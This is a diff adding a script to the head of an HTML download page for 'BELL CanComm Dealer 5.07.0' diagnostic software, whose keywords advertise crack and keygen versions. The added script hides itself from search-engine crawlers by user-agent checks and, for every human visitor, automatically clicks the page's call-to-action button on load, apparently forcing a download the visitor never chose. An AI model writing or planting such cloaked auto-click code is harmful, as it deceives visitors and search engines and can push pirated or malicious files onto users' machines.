@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BELL CanComm Dealer 5.07.0</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download BELL CanComm Dealer 5.07.0 diagnostic software for ECUs. Compatible with multiple BELL vehicles and Windows operating systems.">
     <meta name="keywords" content="BELL CanComm Dealer 5.07.0, BELL CanComm Dealer 5.07.0 download, BELL CanComm Dealer 5.07.0 free download, BELL CanComm Dealer 5.07.0 diagnostic software, BELL diagnostic software, BELL CanComm diagnostic software download, BELL CanComm diagnostic software free download, BELL CanComm Dealer 5.07.0 crack, BELL CanComm Dealer 5.07.0 keygen, BELL CanComm 5.07.0 download, BELL CanComm Dealer 5.07.0 2023, BELL CanComm Dealer 5.07.0 Windows 7, BELL CanComm Dealer 5.07.0 Windows 10, BELL CanComm Dealer 5.07.0 Windows 11, BELL can communication software, BELL software for ECUs, BELL equipment diagnostics, CanComm Dealer diagnostic software, BELL diagnostic tool download, BELL CanComm software crack, BELL CanComm software keygen, BELL CanComm free download, BELL diagnostic software Windows 7, BELL diagnostic software Windows 10, BELL diagnostic software Windows 11, dealer diagnostic software for BELL, CanComm 5.07.0 diagnostic tool">
     <style>
